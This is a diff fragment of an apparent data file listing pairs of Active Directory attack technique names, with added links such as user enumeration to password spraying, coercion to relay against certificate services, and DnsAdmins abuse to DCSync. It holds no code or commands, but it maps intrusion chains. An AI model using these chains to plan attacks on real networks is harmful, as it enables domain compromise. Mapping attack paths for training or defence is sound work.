     ["trust-enum", "child-parent"], ["trust-enum", "trust-key"], ["trust-enum", "trust-ticket"], ["trust-enum", "cross-forest"],
     ["dcsync", "child-parent"], ["golden", "child-parent"], ["trust-key", "trust-ticket"], ["trust-ticket", "cross-forest"],
-    ["child-parent", "golden"], ["unconstrained", "cross-forest"]
+    ["child-parent", "golden"], ["unconstrained", "cross-forest"],
+    /* v2026.10 additions */
+    ["enum-anon", "user-enum"], ["user-enum", "pw-spray"], ["user-enum", "asrep-nc"], ["user-enum", "rc4-downgrade"],
+    ["rc4-downgrade", "ptt"], ["rc4-downgrade", "crack"],
+    ["web-exploit", "local-privesc"], ["web-exploit", "lateral"], ["deserialize", "local-privesc"],
+    ["log4shell", "local-privesc"], ["proxylogon", "lateral"], ["proxylogon", "lsass"],
+    ["webdav-coerce", "relay-adcs"], ["webdav-coerce", "relay-ldap"], ["coerce", "webdav-coerce"],
+    ["enum-ldap", "dnsadmin"], ["acl-abuse", "dnsadmin"], ["dnsadmin", "dcsync"], ["dnsadmin", "lsass"],
+    ["sam", "cached-creds"], ["lsass", "cached-creds"], ["cached-creds", "crack"],
+    ["trust-enum", "foreign-group"], ["foreign-group", "lateral"],
+    ["trust-enum", "forest-sid"], ["dcsync", "forest-sid"], ["golden", "forest-sid"]
   ]
 };
